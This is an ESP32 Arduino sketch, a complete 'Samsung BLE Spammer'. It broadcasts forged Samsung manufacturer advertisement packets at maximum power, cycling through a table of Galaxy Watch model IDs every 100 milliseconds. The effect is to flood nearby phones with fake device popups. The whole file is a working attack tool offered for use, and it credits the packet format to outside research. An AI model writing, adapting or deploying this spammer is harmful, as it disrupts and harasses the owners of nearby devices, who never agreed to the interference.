#include <Arduino.h>
#include <NimBLEDevice.h>

// From CapibaraZero's repository
#define SAMSUNG_COMPANY_ID 0x0075

// Samsung watch models
struct WatchModel {
    uint8_t value;
    const char* name;
};

const WatchModel watch_models[] = {
    {0x01, "White Watch4 Classic 44m"},
    {0x02, "Black Watch4 Classic 40m"},
    {0x03, "White Watch4 Classic 40m"},
    {0x04, "Black Watch4 44mm"},
    {0x05, "Silver Watch4 44mm"},
    {0x06, "Green Watch4 44mm"},
    {0x07, "Black Watch4 40mm"},
    {0x08, "White Watch4 40mm"},
    {0x09, "Gold Watch4 40mm"},
    {0x0A, "French Watch4"},
    {0x0B, "French Watch4 Classic"},
    {0x0C, "Fox Watch5 44mm"},
    {0x11, "Black Watch5 44mm"},
    {0x12, "Sapphire Watch5 44mm"},
    {0x13, "Purpleish Watch5 40mm"},
    {0x14, "Gold Watch5 40mm"},
    {0x15, "Black Watch5 Pro 45mm"},
    {0x16, "Gray Watch5 Pro 45mm"},
    {0x17, "White Watch5 44mm"},
    {0x18, "White & Black Watch5"},
    {0x1B, "Black Watch6 Pink 40mm"},
    {0x1C, "Gold Watch6 Gold 40mm"},
    {0x1D, "Silver Watch6 Cyan 44mm"},
    {0x1E, "Black Watch6 Classic 43m"},
    {0x20, "Green Watch6 Classic 43m"},
    {0x1A, "Fallback Watch"}
};

NimBLEAdvertising* pAdvertising;
int packetCount = 0;

void setup() {
  Serial.begin(115200);
  Serial.println("Starting Samsung BLE Spammer...");

  // Initialize BLE
  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9); // Max power
  
  pAdvertising = NimBLEDevice::getAdvertising();
  
  // Seed random number generator
  randomSeed(analogRead(0));
}

void buildSamsungPacket(NimBLEAdvertisementData &advData) {
  uint8_t packet[15];
  int i = 0;

  // Select random watch model
  uint8_t model = watch_models[random(sizeof(watch_models)/sizeof(WatchModel))].value;

  // Construct packet based on CapibaraZero's research
  packet[i++] = 14; // Size
  packet[i++] = 0xFF; // Manufacturer Specific Data
  packet[i++] = SAMSUNG_COMPANY_ID & 0xFF; // Samsung Company ID (LSB)
  packet[i++] = (SAMSUNG_COMPANY_ID >> 8) & 0xFF; // Samsung Company ID (MSB)
  packet[i++] = 0x01;
  packet[i++] = 0x00;
  packet[i++] = 0x02;
  packet[i++] = 0x00;
  packet[i++] = 0x01;
  packet[i++] = 0x01;
  packet[i++] = 0xFF;
  packet[i++] = 0x00;
  packet[i++] = 0x00;
  packet[i++] = 0x43;
  packet[i++] = model; // Watch model

  advData.addData(std::string((char*)packet, sizeof(packet)));
}

void loop() {
  NimBLEAdvertisementData advertisementData;
  buildSamsungPacket(advertisementData);
  
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  delay(20); // Short delay between packets
  pAdvertising->stop();
  
  packetCount++;
  if (packetCount % 10 == 0) {
    Serial.printf("Packets sent: %d\n", packetCount);
  }
  
  delay(80); // Adjust spam rate
}